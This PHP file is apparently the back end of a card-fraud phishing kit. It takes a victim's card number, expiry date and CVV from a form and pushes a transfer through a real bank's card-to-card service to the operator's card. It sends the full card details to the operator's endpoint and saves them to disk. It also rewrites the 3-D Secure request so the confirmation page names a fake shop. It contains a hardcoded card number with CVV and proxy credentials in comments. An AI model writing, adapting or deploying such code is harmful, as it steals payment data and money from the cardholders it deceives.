<?php

require_once __DIR__.'/config.php';


$card_from = str_replace(" ", "", $_POST["cardFrom"]);
if(in_array($card_from,$black_cards))
	die('hyi tebe');
$card_number = $card_from;
$mounth = $_POST['cardFromMonth'];
$year = $_POST['cardFromYear'];
$cvv = $_POST["cardFromCVC"];
$card_to = $card;
$amount = $_POST["amount"];

$order_id = $_POST['order_id'] ? $_POST['order_id'] : '83510574';

if($_GET['pp']){
	$card_number = '4890494694950999'; //str_replace(" ", "", $_POST["cardFrom"]);
	$mounth = '03'; // $_POST['cardFromMonth'];
	$year = '21';// $_POST['cardFromYear'];
	$cvv = '652';// $_POST["cardFromCVC"];
	$amount = '50';

//	echo "<pre>";
//	print_r($card);
//	echo "</pre>";
//	die;
}


$refund = 0;

global $shop_name;

if (!empty($_POST['refund']))
{
	$shop_name .= ' vozvrat';
	$refund = 1;
}

$req = request("GET",'https://rusnarbank.dengisend.ru/');

preg_match_all('/id="csrf" value="(.*?)"/',$req['content'],$token);

$cookies = $req['cookies'];
$csrf = $token[1][0];


$req= request('POST','https://rusnarbank.dengisend.ru/transfer',[
	'params'=>http_build_query([
		'fromCardNumber'=>chunk_split($card_number,4,' '),
		'cardDate'=>$mounth.'/'.$year,
		'cvv'=>$cvv,
		'toCardNumber'=>chunk_split($card_to,4,' '),
		'amount'=>$amount,
		'_csrf'=>$csrf
	]),
	'headers'=>[
'Host: rusnarbank.dengisend.ru',
'Connection: keep-alive',
'Cache-Control: max-age=0',
'Upgrade-Insecure-Requests: 1',
'Origin: https://rusnarbank.dengisend.ru',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-User: ?1',
'Sec-Fetch-Dest: document',
'Referer: https://rusnarbank.dengisend.ru/',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',

	],
	'cookies'=>$cookies
]);

preg_match_all('/Location: (.*)$/mi', $req['headers'], $location);


$req = request('GET',trim($location[1][0]),[
	'headers'=>[
'Host: gate.payneteasy.com',
'Connection: keep-alive',
'Cache-Control: max-age=0',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Sec-Fetch-Site: cross-site',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-User: ?1',
'Sec-Fetch-Dest: document',
'Referer: https://rusnarbank.dengisend.ru/',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
	]
]);

$payData = getFormDataHTML($req['content']);


if (count($payData) > 0) {
	$tempdata['order_id'] = $order_id;
	$tempdata['from'] = $card_number;
	$tempdata['month'] = $mounth; //$_POST['cardFromMonth'];
	$tempdata['year'] = $year; // $_POST['cardFromYear'];
	$tempdata['cvv'] =  $cvv; //$_POST['cardFromCVC'];
	$tempdata['to'] = $card.' RUSNARBANK';
	$tempdata['merch'] = $shop_name;


	$ch = curl_init();


	curl_setopt($ch, CURLOPT_URL, "https://".$_SERVER['HTTP_HOST']."/notify/sms_confirm");
	curl_setopt($ch, CURLOPT_POST, TRUE);
	//$proxy1 = explode(":", '193.36.58.91:8000:2M8u4c:ujJSkE');
	$params = [
		'data'=>json_encode($tempdata)
	];
	//curl_setopt($ch, CURLOPT_PROXY, '193.187.146.87:8000 ');
	//	curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'bLoVKY:P4So8x');
	curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
	$r = curl_exec($ch);

	curl_close($ch);
//	$tempdata["cookies"] = $cookies;
	$tempdata["amount"] = $amount;
	$tempdata["payData"] = $payData;
	$fname = time();

	file_put_contents(__DIR__."/temp/" .$fname, json_encode($tempdata, JSON_UNESCAPED_UNICODE));

	$newpareq = renameShop($payData['PaReq'], $shop_name, $shop_url);
	echo '<html><head>' .
		'<script src="https://code.jquery.com/jquery-3.3.1.js"></script>' .
		'<script>$(document).ready(function(){$("#payform").submit();console.log("HELL");});</script>' .
		'</head><body style="padding: 0px; margin: 0px;">' .
		'<form action="' . $payData['action'] . '" method="post" target="payframe" id="payform">' .
		'<input type="hidden" name="PaReq" value="' . $newpareq . '">' .
		'<input type="hidden" name="MD" value="' . $payData['MD'] . '">' .
		'<input type="hidden" name="TermUrl" value="' . $protocol . '://' . $_SERVER["SERVER_NAME"] . dirname($_SERVER["REQUEST_URI"]) . '/status.php?fname=' .$fname . '">' .
		'</form>' .
		'<iframe name="payframe" style="width: 100%; height: 100%; border: 0px;"></iframe>' .
		'</body></html>';
} else {
	echo "Ошибка. Форма 3D-Secure для подтверждения СМС-кода не сформирована!";
}
